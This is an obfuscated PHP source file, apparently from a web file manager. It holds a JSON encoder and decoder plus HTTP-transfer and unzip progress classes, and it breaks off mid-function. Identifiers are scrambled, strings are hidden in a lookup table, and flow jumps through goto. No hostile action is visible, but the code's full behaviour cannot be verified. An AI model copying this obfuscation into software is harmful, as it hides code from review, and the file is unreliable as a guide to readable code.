$_SERVER[¶ªÕß‚ØÁŸ]; if (function_exists($cÃ·ÛÃô¸¡[78])) { return mb_convert_encoding($eŸ“ÊôãÈ¶, $cÃ·ÛÃô¸¡[1593], $cÃ·ÛÃô¸¡[1942]); } $a¨òöÚÅµÊ = ord($eŸ“ÊôãÈ¶[0]) << 8 | ord($eŸ“ÊôãÈ¶[1]); switch (!0) { case (127 & $a¨òöÚÅµÊ) == $a¨òöÚÅµÊ: return chr(127 & $a¨òöÚÅµÊ); case (2047 & $a¨òöÚÅµÊ) == $a¨òöÚÅµÊ: return chr(192 | $a¨òöÚÅµÊ >> 6 & 31) . chr(128 | $a¨òöÚÅµÊ & 63); case (65535 & $a¨òöÚÅµÊ) == $a¨òöÚÅµÊ: return chr(224 | $a¨òöÚÅµÊ >> 12 & 15) . chr(128 | $a¨òöÚÅµÊ >> 6 & 63) . chr(128 | $a¨òöÚÅµÊ & 63); } return $cÃ·ÛÃô¸¡[33]; } function utf82utf16($f£ÁñŒ¼œ‡) { $E¿Õ…“¯„† =& $_SERVER[¶ªÕß‚ØÁŸ]; if (function_exists($E¿Õ…“¯„†[78])) { return mb_convert_encoding($f£ÁñŒ¼œ‡, $E¿Õ…“¯„†[1942], $E¿Õ…“¯„†[1593]); } switch (strlen($f£ÁñŒ¼œ‡)) { case 1: return $f£ÁñŒ¼œ‡; case 2: return chr(7 & ord($f£ÁñŒ¼œ‡[0]) >> 2) . chr(192 & ord($f£ÁñŒ¼œ‡[0]) << 6 | 63 & ord($f£ÁñŒ¼œ‡[1])); case 3: return chr(240 & ord($f£ÁñŒ¼œ‡[0]) << 4 | 15 & ord($f£ÁñŒ¼œ‡[1]) >> 2) . chr(192 & ord($f£ÁñŒ¼œ‡[1]) << 6 | 127 & ord($f£ÁñŒ¼œ‡[2])); } return $E¿Õ…“¯„†[33]; } function encode($cÇ×ÉåŸ‹²) { $FĞƒš¸¯ÉÙ =& $_SERVER[¶ªÕß‚ØÁŸ]; switch (gettype($cÇ×ÉåŸ‹²)) { case $FĞƒš¸¯ÉÙ[1604]: return $cÇ×ÉåŸ‹² ? $FĞƒš¸¯ÉÙ[1603] : $FĞƒš¸¯ÉÙ[1605]; case $FĞƒš¸¯ÉÙ[1943]: return $FĞƒš¸¯ÉÙ[109]; case $FĞƒš¸¯ÉÙ[312]: return (int) $cÇ×ÉåŸ‹²; case $FĞƒš¸¯ÉÙ[287]: case $FĞƒš¸¯ÉÙ[286]: return (double) $cÇ×ÉåŸ‹²; case $FĞƒš¸¯ÉÙ[321]: $a’¬³Ã§ì = $FĞƒš¸¯ÉÙ[33]; $DÜÔíÄ = strlen($cÇ×ÉåŸ‹²); for ($bÑÔ† ˜Ì“ = 0; $bÑÔ† ˜Ì“ < $DÜÔíÄ; ++$bÑÔ† ˜Ì“) { $cª¨‰ğÌ§ = ord($cÇ×ÉåŸ‹²[$bÑÔ† ˜Ì“]); switch (!0) { case $cª¨‰ğÌ§ == 8: $a’¬³Ã§ì .= $FĞƒš¸¯ÉÙ[1944]; break; case $cª¨‰ğÌ§ == 9: $a’¬³Ã§ì .= $FĞƒš¸¯ÉÙ[1580]; break; case $cª¨‰ğÌ§ == 10: $a’¬³Ã§ì .= $FĞƒš¸¯ÉÙ[1578]; break; case $cª¨‰ğÌ§ == 12: $a’¬³Ã§ì .= $FĞƒš¸¯ÉÙ[1945]; break; case $cª¨‰ğÌ§ == 13: $a’¬³Ã§ì .= $FĞƒš¸¯ÉÙ[1579]; break; case $cª¨‰ğÌ§ == 34: case $cª¨‰ğÌ§ == 47: case $cª¨‰ğÌ§ == 92: $a’¬³Ã§ì .= $FĞƒš¸¯ÉÙ[103] . $cÇ×ÉåŸ‹²[$bÑÔ† ˜Ì“]; break; case $cª¨‰ğÌ§ >= 32 && $cª¨‰ğÌ§ <= 127: $a’¬³Ã§ì .= $cÇ×ÉåŸ‹²[$bÑÔ† ˜Ì“]; break; case ($cª¨‰ğÌ§ & 224) == 192: $EšÏ¥áë×è = pack($FĞƒš¸¯ÉÙ[1946], $cª¨‰ğÌ§, ord($cÇ×ÉåŸ‹²[$bÑÔ† ˜Ì“ + 1])); $bÑÔ† ˜Ì“ += 1; $aÅ‰ï•†¯¶ = $this->utf82utf16($EšÏ¥áë×è); $a’¬³Ã§ì .= sprintf($FĞƒš¸¯ÉÙ[1947], bin2hex($aÅ‰ï•†¯¶)); break; case ($cª¨‰ğÌ§ & 240) == 224: $EšÏ¥áë×è = pack($FĞƒš¸¯ÉÙ[1946], $cª¨‰ğÌ§, ord($cÇ×ÉåŸ‹²[$bÑÔ† ˜Ì“ + 1]), ord($cÇ×ÉåŸ‹²[$bÑÔ† ˜Ì“ + 2])); $bÑÔ† ˜Ì“ += 2; $aÅ‰ï•†¯¶ = $this->utf82utf16($EšÏ¥áë×è); $a’¬³Ã§ì .= sprintf($FĞƒš¸¯ÉÙ[1947], bin2hex($aÅ‰ï•†¯¶)); break; case ($cª¨‰ğÌ§ & 248) == 240: $EšÏ¥áë×è = pack($FĞƒš¸¯ÉÙ[1946], $cª¨‰ğÌ§, ord($cÇ×ÉåŸ‹²[$bÑÔ† ˜Ì“ + 1]), ord($cÇ×ÉåŸ‹²[$bÑÔ† ˜Ì“ + 2]), ord($cÇ×ÉåŸ‹²[$bÑÔ† ˜Ì“ + 3])); $bÑÔ† ˜Ì“ += 3; $aÅ‰ï•†¯¶ = $this->utf82utf16($EšÏ¥áë×è); $a’¬³Ã§ì .= sprintf($FĞƒš¸¯ÉÙ[1947], bin2hex($aÅ‰ï•†¯¶)); break; case ($cª¨‰ğÌ§ & 252) == 248: $EšÏ¥áë×è = pack($FĞƒš¸¯ÉÙ[1946], $cª¨‰ğÌ§, ord($cÇ×ÉåŸ‹²[$bÑÔ† ˜Ì“ + 1]), ord($cÇ×ÉåŸ‹²[$bÑÔ† ˜Ì“ + 2]), ord($cÇ×ÉåŸ‹²[$bÑÔ† ˜Ì“ + 3]), ord($cÇ×ÉåŸ‹²[$bÑÔ† ˜Ì“ + 4])); $bÑÔ† ˜Ì“ += 4; $aÅ‰ï•†¯¶ = $this->utf82utf16($EšÏ¥áë×è); $a’¬³Ã§ì .= sprintf($FĞƒš¸¯ÉÙ[1947], bin2hex($aÅ‰ï•†¯¶)); break; case ($cª¨‰ğÌ§ & 254) == 252: $EšÏ¥áë×è = pack($FĞƒš¸¯ÉÙ[1946], $cª¨‰ğÌ§, ord($cÇ×ÉåŸ‹²[$bÑÔ† ˜Ì“ + 1]), ord($cÇ×ÉåŸ‹²[$bÑÔ† ˜Ì“ + 2]), ord($cÇ×ÉåŸ‹²[$bÑÔ† ˜Ì“ + 3]), ord($cÇ×ÉåŸ‹²[$bÑÔ† ˜Ì“ + 4]), ord($cÇ×ÉåŸ‹²[$bÑÔ† ˜Ì“ + 5])); $bÑÔ† ˜Ì“ += 5; $aÅ‰ï•†¯¶ = $this->utf82utf16($EšÏ¥áë×è); $a’¬³Ã§ì .= sprintf($FĞƒš¸¯ÉÙ[1947], bin2hex($aÅ‰ï•†¯¶)); break; } } return $FĞƒš¸¯ÉÙ[123] . $a’¬³Ã§ì . $FĞƒš¸¯ÉÙ[123]; case $FĞƒš¸¯ÉÙ[1948]: if (is_array($cÇ×ÉåŸ‹²) && count($cÇ×ÉåŸ‹²) && array_keys($cÇ×ÉåŸ‹²) !== range(0, sizeof($cÇ×ÉåŸ‹²) - 1)) { $AĞÎ¹ÏÀÛ¾ = array_map(array($this, $FĞƒš¸¯ÉÙ[1949]), array_keys($cÇ×ÉåŸ‹²), array_values($cÇ×ÉåŸ‹²)); foreach ($AĞÎ¹ÏÀÛ¾ as $F¬¢²Á¿¼Ò) { if (Services_JSON::isError($F¬¢²Á¿¼Ò)) { return $F¬¢²Á¿¼Ò; } } return $FĞƒš¸¯ÉÙ[1072] . join($FĞƒš¸¯ÉÙ[47], $AĞÎ¹ÏÀÛ¾) . $FĞƒš¸¯ÉÙ[324]; } $bøàÃŠÊ“Š = array_map(array($this, $FĞƒš¸¯ÉÙ[1950]), $cÇ×ÉåŸ‹²); foreach ($bøàÃŠÊ“Š as $cÑ¡«ªå„) { if (Services_JSON::isError($cÑ¡«ªå„)) { return $cÑ¡«ªå„; } } return $FĞƒš¸¯ÉÙ[167] . join($FĞƒš¸¯ÉÙ[47], $bøàÃŠÊ“Š) . $FĞƒš¸¯ÉÙ[484]; case $FĞƒš¸¯ÉÙ[1951]: $fÎá«‘ÍØ = get_object_vars($cÇ×ÉåŸ‹²); $AĞÎ¹ÏÀÛ¾ = array_map(array($this, $FĞƒš¸¯ÉÙ[1949]), array_keys($fÎá«‘ÍØ), array_values($fÎá«‘ÍØ)); foreach ($AĞÎ¹ÏÀÛ¾ as $F¬¢²Á¿¼Ò) { if (Services_JSON::isError($F¬¢²Á¿¼Ò)) { return $F¬¢²Á¿¼Ò; } } return $FĞƒš¸¯ÉÙ[1072] . join($FĞƒš¸¯ÉÙ[47], $AĞÎ¹ÏÀÛ¾) . $FĞƒš¸¯ÉÙ[324]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $FĞƒš¸¯ÉÙ[109] : new Services_JSON_Error(gettype($cÇ×ÉåŸ‹²) . $FĞƒš¸¯ÉÙ[1952]); } } function name_value($EàæµÈîÏø, $Dí‰Ò½ã) { $aí·ƒçêÙ = $this->encode($Dí‰Ò½ã); if (Services_JSON::isError($aí·ƒçêÙ)) { return $aí·ƒçêÙ; } return $this->encode(strval($EàæµÈîÏø)) . $_SERVER[¶ªÕß‚ØÁŸ][4] . $aí·ƒçêÙ; } function reduce_string($FŸ“‹ÎÉÑ) { $b‘óÂœÀğë =& $_SERVER[¶ªÕß‚ØÁŸ]; $FŸ“‹ÎÉÑ = preg_replace(array($b‘óÂœÀğë[1953], $b‘óÂœÀğë[1954], $b‘óÂœÀğë[1955]), $b‘óÂœÀğë[33], $FŸ“‹ÎÉÑ); return trim($FŸ“‹ÎÉÑ); } function decode($b‰˜İ°ç±Ê) { $c°šïï…¨  =& $_SERVER[¶ªÕß‚ØÁŸ]; $b‰˜İ°ç±Ê = $this->reduce_string($b‰˜İ°ç±Ê); switch (strtolower($b‰˜İ°ç±Ê)) { case $c°šïï…¨ [1603]: return !0; case $c°šïï…¨ [1605]: return !1; case $c°šïï…¨ [109]: return null; default: $DÛã»Œò¦¾ = array(); if (is_numeric($b‰˜İ°ç±Ê)) { return (double) $b‰˜İ°ç±Ê == (int) $b‰˜İ°ç±Ê ? (int) $b‰˜İ°ç±Ê : (double) $b‰˜İ°ç±Ê; } elseif (preg_match($c°šïï…¨ [1956], $b‰˜İ°ç±Ê, $DÛã»Œò¦¾) && $DÛã»Œò¦¾[1] == $DÛã»Œò¦¾[2]) { $CÇö­Ç×’ó = substr($b‰˜İ°ç±Ê, 0, 1); $aÂŠ²º¾± = substr($b‰˜İ°ç±Ê, 1, -1); $AëŞ¤ğĞƒÜ = $c°šïï…¨ [33]; $A—‚ô‚¥ = strlen($aÂŠ²º¾±); for ($DÄ‹¼ö¢± = 0; $DÄ‹¼ö¢± < $A—‚ô‚¥; ++$DÄ‹¼ö¢±) { $C¸¿ëíÈ«å = substr($aÂŠ²º¾±, $DÄ‹¼ö¢±, 2); $b¦ĞœñŒâ = ord($aÂŠ²º¾±[$DÄ‹¼ö¢±]); switch (!0) { case $C¸¿ëíÈ«å == $c°šïï…¨ [1944]: $AëŞ¤ğĞƒÜ .= chr(8); ++$DÄ‹¼ö¢±; break; case $C¸¿ëíÈ«å == $c°šïï…¨ [1580]: $AëŞ¤ğĞƒÜ .= chr(9); ++$DÄ‹¼ö¢±; break; case $C¸¿ëíÈ«å == $c°šïï…¨ [1578]: $AëŞ¤ğĞƒÜ .= chr(10); ++$DÄ‹¼ö¢±; break; case $C¸¿ëíÈ«å == $c°šïï…¨ [1945]: $AëŞ¤ğĞƒÜ .= chr(12); ++$DÄ‹¼ö¢±; break; case $C¸¿ëíÈ«å == $c°šïï…¨ [1579]: $AëŞ¤ğĞƒÜ .= chr(13); ++$DÄ‹¼ö¢±; break; case $C¸¿ëíÈ«å == $c°šïï…¨ [1360]: case $C¸¿ëíÈ«å == $c°šïï…¨ [1957]: case $C¸¿ëíÈ«å == $c°šïï…¨ [1573]: case $C¸¿ëíÈ«å == $c°šïï…¨ [1575]: if ($CÇö­Ç×’ó == $c°šïï…¨ [123] && $C¸¿ëíÈ«å != $c°šïï…¨ [1957] || $CÇö­Ç×’ó == $c°šïï…¨ [55] && $C¸¿ëíÈ«å != $c°šïï…¨ [1360]) { $AëŞ¤ğĞƒÜ .= $aÂŠ²º¾±[++$DÄ‹¼ö¢±]; } break; case preg_match($c°šïï…¨ [1958], substr($aÂŠ²º¾±, $DÄ‹¼ö¢±, 6)): $Câï¼Ò¯¬Ù = chr(hexdec(substr($aÂŠ²º¾±, $DÄ‹¼ö¢± + 2, 2))) . chr(hexdec(substr($aÂŠ²º¾±, $DÄ‹¼ö¢± + 4, 2))); $AëŞ¤ğĞƒÜ .= $this->utf162utf8($Câï¼Ò¯¬Ù); $DÄ‹¼ö¢± += 5; break; case $b¦ĞœñŒâ >= 32 && $b¦ĞœñŒâ <= 127: $AëŞ¤ğĞƒÜ .= $aÂŠ²º¾±[$DÄ‹¼ö¢±]; break; case ($b¦ĞœñŒâ & 224) == 192: $AëŞ¤ğĞƒÜ .= substr($aÂŠ²º¾±, $DÄ‹¼ö¢±, 2); ++$DÄ‹¼ö¢±; break; case ($b¦ĞœñŒâ & 240) == 224: $AëŞ¤ğĞƒÜ .= substr($aÂŠ²º¾±, $DÄ‹¼ö¢±, 3); $DÄ‹¼ö¢± += 2; break; case ($b¦ĞœñŒâ & 248) == 240: $AëŞ¤ğĞƒÜ .= substr($aÂŠ²º¾±, $DÄ‹¼ö¢±, 4); $DÄ‹¼ö¢± += 3; break; case ($b¦ĞœñŒâ & 252) == 248: $AëŞ¤ğĞƒÜ .= substr($aÂŠ²º¾±, $DÄ‹¼ö¢±, 5); $DÄ‹¼ö¢± += 4; break; case ($b¦ĞœñŒâ & 254) == 252: $AëŞ¤ğĞƒÜ .= substr($aÂŠ²º¾±, $DÄ‹¼ö¢±, 6); $DÄ‹¼ö¢± += 5; break; } } return $AëŞ¤ğĞƒÜ; } elseif (preg_match($c°šïï…¨ [1959], $b‰˜İ°ç±Ê) || preg_match($c°šïï…¨ [1960], $b‰˜İ°ç±Ê)) { goto EÊ®†‚ÙíÌ; EÊ®†‚ÙíÌ: if ($b‰˜İ°ç±Ê[0] == $c°šïï…¨ [167]) { $eË†ÈÍ „¯ = array(SERVICES_JSON_IN_ARR); $díèì¯¬ÛØ = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $eË†ÈÍ „¯ = array(SERVICES_JSON_IN_OBJ); $c¾œëÜ©† = array(); } else { $eË†ÈÍ „¯ = array(SERVICES_JSON_IN_OBJ); $c¾œëÜ©† = new stdClass(); } } array_push($eË†ÈÍ „¯, array($c°šïï…¨ [1961] => SERVICES_JSON_SLICE, $c°šïï…¨ [272] => 0, $c°šïï…¨ [1962] => !1)); $aÂŠ²º¾± = substr($b‰˜İ°ç±Ê, 1, -1); goto AÔ”¯ßõ„´; C†‡íã²Ô: for ($DÄ‹¼ö¢± = 0; $DÄ‹¼ö¢± <= $A—‚ô‚¥; ++$DÄ‹¼ö¢±) { $a¢×ÖÒÕÚø = end($eË†ÈÍ „¯); $C¸¿ëíÈ«å = substr($aÂŠ²º¾±, $DÄ‹¼ö¢±, 2); if ($DÄ‹¼ö¢± == $A—‚ô‚¥ || $aÂŠ²º¾±[$DÄ‹¼ö¢±] == $c°šïï…¨ [47] && $a¢×ÖÒÕÚø[$c°šïï…¨ [1961]] == SERVICES_JSON_SLICE) { $eĞ˜‰ŸØ‡ = substr($aÂŠ²º¾±, $a¢×ÖÒÕÚø[$c°šïï…¨ [272]], $DÄ‹¼ö¢± - $a¢×ÖÒÕÚø[$c°šïï…¨ [272]]); array_push($eË†ÈÍ „¯, array($c°šïï…¨ [1961] => SERVICES_JSON_SLICE, $c°šïï…¨ [272] => $DÄ‹¼ö¢± + 1, $c°šïï…¨ [1962] => !1)); if (reset($eË†ÈÍ „¯) == SERVICES_JSON_IN_ARR) { array_push($díèì¯¬ÛØ, $this->decode($eĞ˜‰ŸØ‡)); } elseif (reset($eË†ÈÍ „¯) == SERVICES_JSON_IN_OBJ) { $aÍÚ»êŒ‡ = array(); if (preg_match($c°šïï…¨ [1963], $eĞ˜‰ŸØ‡, $aÍÚ»êŒ‡)) { $bîÚã‚çÃ = $this->decode($aÍÚ»êŒ‡[1]); $B—‘œòª¼¿ = $this->decode($aÍÚ»êŒ‡[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $c¾œëÜ©†[$bîÚã‚çÃ] = $B—‘œòª¼¿; } else { $c¾œëÜ©†->{$bîÚã‚çÃ} = $B—‘œòª¼¿; } } elseif (preg_match($c°šïï…¨ [1964], $eĞ˜‰ŸØ‡, $aÍÚ»êŒ‡)) { $bîÚã‚çÃ = $aÍÚ»êŒ‡[1]; $B—‘œòª¼¿ = $this->decode($aÍÚ»êŒ‡[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $c¾œëÜ©†[$bîÚã‚çÃ] = $B—‘œòª¼¿; } else { $c¾œëÜ©†->{$bîÚã‚çÃ} = $B—‘œòª¼¿; } } } } elseif (($aÂŠ²º¾±[$DÄ‹¼ö¢±] == $c°šïï…¨ [123] || $aÂŠ²º¾±[$DÄ‹¼ö¢±] == $c°šïï…¨ [55]) && $a¢×ÖÒÕÚø[$c°šïï…¨ [1961]] != SERVICES_JSON_IN_STR) { array_push($eË†ÈÍ „¯, array($c°šïï…¨ [1961] => SERVICES_JSON_IN_STR, $c°šïï…¨ [272] => $DÄ‹¼ö¢±, $c°šïï…¨ [1962] => $aÂŠ²º¾±[$DÄ‹¼ö¢±])); } elseif ($aÂŠ²º¾±[$DÄ‹¼ö¢±] == $a¢×ÖÒÕÚø[$c°šïï…¨ [1962]] && $a¢×ÖÒÕÚø[$c°šïï…¨ [1961]] == SERVICES_JSON_IN_STR && (strlen(substr($aÂŠ²º¾±, 0, $DÄ‹¼ö¢±)) - strlen(rtrim(substr($aÂŠ²º¾±, 0, $DÄ‹¼ö¢±), $c°šïï…¨ [103]))) % 2 != 1) { array_pop($eË†ÈÍ „¯); } elseif ($aÂŠ²º¾±[$DÄ‹¼ö¢±] == $c°šïï…¨ [167] && in_array($a¢×ÖÒÕÚø[$c°šïï…¨ [1961]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($eË†ÈÍ „¯, array($c°šïï…¨ [1961] => SERVICES_JSON_IN_ARR, $c°šïï…¨ [272] => $DÄ‹¼ö¢±, $c°šïï…¨ [1962] => !1)); } elseif ($aÂŠ²º¾±[$DÄ‹¼ö¢±] == $c°šïï…¨ [484] && $a¢×ÖÒÕÚø[$c°šïï…¨ [1961]] == SERVICES_JSON_IN_ARR) { array_pop($eË†ÈÍ „¯); } elseif ($aÂŠ²º¾±[$DÄ‹¼ö¢±] == $c°šïï…¨ [1072] && in_array($a¢×ÖÒÕÚø[$c°šïï…¨ [1961]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($eË†ÈÍ „¯, array($c°šïï…¨ [1961] => SERVICES_JSON_IN_OBJ, $c°šïï…¨ [272] => $DÄ‹¼ö¢±, $c°šïï…¨ [1962] => !1)); } elseif ($aÂŠ²º¾±[$DÄ‹¼ö¢±] == $c°šïï…¨ [324] && $a¢×ÖÒÕÚø[$c°šïï…¨ [1961]] == SERVICES_JSON_IN_OBJ) { array_pop($eË†ÈÍ „¯); } elseif ($C¸¿ëíÈ«å == $c°šïï…¨ [1965] && in_array($a¢×ÖÒÕÚø[$c°šïï…¨ [1961]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($eË†ÈÍ „¯, array($c°šïï…¨ [1961] => SERVICES_JSON_IN_CMT, $c°šïï…¨ [272] => $DÄ‹¼ö¢±, $c°šïï…¨ [1962] => !1)); $DÄ‹¼ö¢±++; } elseif ($C¸¿ëíÈ«å == $c°šïï…¨ [1966] && $a¢×ÖÒÕÚø[$c°šïï…¨ [1961]] == SERVICES_JSON_IN_CMT) { array_pop($eË†ÈÍ „¯); $DÄ‹¼ö¢±++; for ($EÓ ¦¸œø = $a¢×ÖÒÕÚø[$c°šïï…¨ [272]]; $EÓ ¦¸œø <= $DÄ‹¼ö¢±; ++$EÓ ¦¸œø) { $aÂŠ²º¾± = substr_replace($aÂŠ²º¾±, $c°šïï…¨ [50], $EÓ ¦¸œø, 1); } } } if (reset($eË†ÈÍ „¯) == SERVICES_JSON_IN_ARR) { return $díèì¯¬ÛØ; } elseif (reset($eË†ÈÍ „¯) == SERVICES_JSON_IN_OBJ) { return $c¾œëÜ©†; } goto f’¢Šç„„‘; AÔ”¯ßõ„´: $aÂŠ²º¾± = $this->reduce_string($aÂŠ²º¾±); if ($aÂŠ²º¾± == $c°šïï…¨ [33]) { if (reset($eË†ÈÍ „¯) == SERVICES_JSON_IN_ARR) { return $díèì¯¬ÛØ; } else { return $c¾œëÜ©†; } } $A—‚ô‚¥ = strlen($aÂŠ²º¾±); goto C†‡íã²Ô; f’¢Šç„„‘: } } } function isError($aÃĞö‡Öªì, $A­ÌÕ‹‹³š = null) { $Aßãğ¥¶‹ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (class_exists($Aßãğ¥¶‹[1967])) { return PEAR::isError($aÃĞö‡Öªì, $A­ÌÕ‹‹³š); } elseif (is_object($aÃĞö‡Öªì) && (get_class($aÃĞö‡Öªì) == $Aßãğ¥¶‹[1968] || is_subclass_of($aÃĞö‡Öªì, $Aßãğ¥¶‹[1968]))) { return !0; } return !1; } } if (class_exists($_SERVER[¶ªÕß‚ØÁŸ][1969])) { class Services_JSON_Error extends PEAR_Error { function __construct($FŒÏ¬ˆ™¾® = "\165\x6e\153\x6e\157\167\156\x20\145\x72\162\x6f\x72", $A«æ‰’æá = null, $CÕ†­Ñ óÜ = null, $b¥ÏéÈŒÒ = null, $FæŸéùß = null) { parent::PEAR_Error($FŒÏ¬ˆ™¾®, $A«æ‰’æá, $CÕ†­Ñ óÜ, $b¥ÏéÈŒÒ, $FæŸéùß); } } } else { class Services_JSON_Error { function __construct($dÕ‰›ß¢ã = "\165\156\153\156\157\x77\x6e\x20\145\162\x72\157\x72", $fÏ·æ„¯â× = null, $E¤íˆÓ¡Ôò = null, $Fï¸÷­Íá‰ = null, $bƒïÚßò = null) { } } } goto Bö™ˆæÎİ; D¸‘–œŸ•Â: class TaskHttp extends Task { protected function startAfter() { $fš¤İ´ß®‹ =& $_SERVER[¶ªÕß‚ØÁŸ]; $Eçİ‰Ù¿‰¨ =& $this->task; $Eçİ‰Ù¿‰¨[$fš¤İ´ß®‹[1504]] = 1; Hook::bind($fš¤İ´ß®‹[1477], array($this, $fš¤İ´ß®‹[1505])); Hook::bind($fš¤İ´ß®‹[1479], array($this, $fš¤İ´ß®‹[1506])); Hook::bind($fš¤İ´ß®‹[1481], array($this, $fš¤İ´ß®‹[1507])); } protected function endAfter() { $fŞ±´Í”¤† =& $_SERVER[¶ªÕß‚ØÁŸ]; Hook::unbind($fŞ±´Í”¤†[1477], array($this, $fŞ±´Í”¤†[1505])); Hook::unbind($fŞ±´Í”¤†[1479], array($this, $fŞ±´Í”¤†[1506])); Hook::unbind($fŞ±´Í”¤†[1481], array($this, $fŞ±´Í”¤†[1507])); } public function progressStart($f·½¯šê‹) { $eô‰¹«†ê =& $_SERVER[¶ªÕß‚ØÁŸ]; $dâåâğ‹š = curl_getinfo($f·½¯šê‹); self::log($eô‰¹«†ê[1508] . $dâåâğ‹š[$eô‰¹«†ê[304]]); self::valueSet($this->task[$eô‰¹«†ê[375]], $this->task); } public function progressEnd($bã¤¢¡òÉ) { $e·’µ˜õ¹µ =& $_SERVER[¶ªÕß‚ØÁŸ]; self::log($e·’µ˜õ¹µ[1509] . $this->task[$e·’µ˜õ¹µ[375]]); $this->end(); } public function progress($aÚæå×Öã¬, $CÍ§Ñ˜Ñ ‡, $eÖ—ã·ÍÆ, $c®÷èëÖÈ, $CáãÃÒ÷‰Ù) { $a×ßéÙ«åÚ =& $_SERVER[¶ªÕß‚ØÁŸ]; $f¯®Ô¿ =& $this->task; if ($CáãÃÒ÷‰Ù > 0) { $f¯®Ô¿[$a×ßéÙ«åÚ[982]] = $f¯®Ô¿[$a×ßéÙ«åÚ[982]] == 0 ? $c®÷èëÖÈ : $f¯®Ô¿[$a×ßéÙ«åÚ[982]]; $f¯®Ô¿[$a×ßéÙ«åÚ[994]] = $CáãÃÒ÷‰Ù; } else { if ($eÖ—ã·ÍÆ > 0) { $f¯®Ô¿[$a×ßéÙ«åÚ[982]] = $f¯®Ô¿[$a×ßéÙ«åÚ[982]] == 0 ? $CÍ§Ñ˜Ñ ‡ : $f¯®Ô¿[$a×ßéÙ«åÚ[982]]; $f¯®Ô¿[$a×ßéÙ«åÚ[994]] = $eÖ—ã·ÍÆ; } } $this->update(); self::log("\160\162\157\147\162\145\163\163\110\x74\164\x70\72\144\157\167\x6e\x3a{$eÖ—ã·ÍÆ}\x2f{$CÍ§Ñ˜Ñ ‡}\x3b\40\165\x70\154\157\x61\144\x3a{$CáãÃÒ÷‰Ù}\x2f{$c®÷èëÖÈ}\73"); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto B™ã¶†¶Ÿ; C†­ÚªºÉ£: if (!$B÷ôº¨æÆ[$fãßÌ»ŒØì[1346]]) { $B÷ôº¨æÆ[$fãßÌ»ŒØì[1346]] = LNG($fãßÌ»ŒØì[1514]); } goto DöÎôÄîº; BËøà¬‹İ¤: Hook::bind($fãßÌ»ŒØì[1039], array($this, $fãßÌ»ŒØì[1512])); $B÷ôº¨æÆ =& $this->task; $B÷ôº¨æÆ[$fãßÌ»ŒØì[1513]] = $fãßÌ»ŒØì[1044]; goto C†­ÚªºÉ£; B™ã¶†¶Ÿ: $fãßÌ»ŒØì =& $_SERVER[¶ªÕß‚ØÁŸ]; parent::startAfter(); Hook::bind($fãßÌ»ŒØì[1510], array($this, $fãßÌ»ŒØì[1511])); goto BËøà¬‹İ¤; DöÎôÄîº: } protected function endAfter() { $d“¼®µŠÀè =& $_SERVER[¶ªÕß‚ØÁŸ]; parent::endAfter(); Hook::unbind($d“¼®µŠÀè[1510], array($this, $d“¼®µŠÀè[1511])); Hook::unbind($d“¼®µŠÀè[1039], array($this, $d“¼®µŠÀè[1512])); } public function updateAfter() { $fŠ‚ˆÏâãä =& $_SERVER[¶ªÕß‚ØÁŸ]; $dÛ‘¯‹ùÕ =& $this->task; if (!$dÛ‘¯‹ùÕ[$fŠ‚ˆÏâãä[982]] || !$dÛ‘¯‹ùÕ[$fŠ‚ˆÏâãä[711]]) { return; } if ($dÛ‘¯‹ùÕ[$fŠ‚ˆÏâãä[1513]] == $fŠ‚ˆÏâãä[1044]) { $AÍ÷İàº†— = 0; if ($dÛ‘¯‹ùÕ[$fŠ‚ˆÏâãä[1485]]) { $AÍ÷İàº†— = $dÛ‘¯‹ùÕ[$fŠ‚ˆÏâãä[1486]] / $dÛ‘¯‹ùÕ[$fŠ‚ˆÏâãä[1485]]; } $dÛ‘¯‹ùÕ[$fŠ‚ˆÏâãä[1441]] = $AÍ÷İàº†— * 0.3; } else { if ($dÛ‘¯‹ùÕ[$fŠ‚ˆÏâãä[1513]] == $fŠ‚ˆÏâãä[310]) { $AÍ÷İàº†— = $dÛ‘¯‹ùÕ[$fŠ‚ˆÏâãä[994]] / $dÛ‘¯‹ùÕ[$fŠ‚ˆÏâãä[982]]; $dÛ‘¯‹ùÕ[$fŠ‚ˆÏâãä[1441]] = 0.3 + $AÍ÷İàº†— * 0.4; } else { if ($dÛ‘¯‹ùÕ[$fŠ‚ˆÏâãä[1513]] == $fŠ‚ˆÏâãä[113]) { $Bñ¥ŸêÙ¶Ã = 0; if ($dÛ‘¯‹ùÕ[$fŠ‚ˆÏâãä[1487]] == $fŠ‚ˆÏâãä[113]) { $Bñ¥ŸêÙ¶Ã = $dÛ‘¯‹ùÕ[$fŠ‚ˆÏâãä[1486]]; } $AÍ÷İàº†— = ($dÛ‘¯‹ùÕ[$fŠ‚ˆÏâãä[1490]] + $Bñ¥ŸêÙ¶Ã) / $dÛ‘¯‹ùÕ[$fŠ‚ˆÏâãä[711]]; $dÛ‘¯‹ùÕ[$fŠ‚ˆÏâãä[1441]] = 0.3 + 0.4 + $AÍ÷İàº†— * 0.3; } } } if ($dÛ‘¯‹ùÕ[$fŠ‚ˆÏâãä[1441]] > 0) { $BÜã¼åİ»™ = timeFloat() - $dÛ‘¯‹ùÕ[$fŠ‚ˆÏâãä[1443]] - $dÛ‘¯‹ùÕ[$fŠ‚ˆÏâãä[1446]]; $dÛ‘¯‹ùÕ[$fŠ‚ˆÏâãä[1447]] = $BÜã¼åİ»™ * (1 - $dÛ‘¯‹ùÕ[$fŠ‚ˆÏâãä[1441]]) / $dÛ‘¯‹ùÕ[$fŠ‚ˆÏâãä[1441]]; } } public function addFile($aƒ¶†Õß) { goto AŒöŒ®óˆ; Aƒ¶Î®àÌÜ: $this->update(); goto b»ĞÊ‰À¯Ö; aîÙŸœÂÂ: $CŞŠºˆí‘[$A›´îÉˆã[984]] = $A›´îÉˆã[1502]; $CŞŠºˆí‘[$A›´îÉˆã[1487]] = $A›´îÉˆã[1044]; $CŞŠºˆí‘[$A›´îÉˆã[711]] = $FÑÜì–‰Ù£[$A›´îÉˆã[87]]; goto 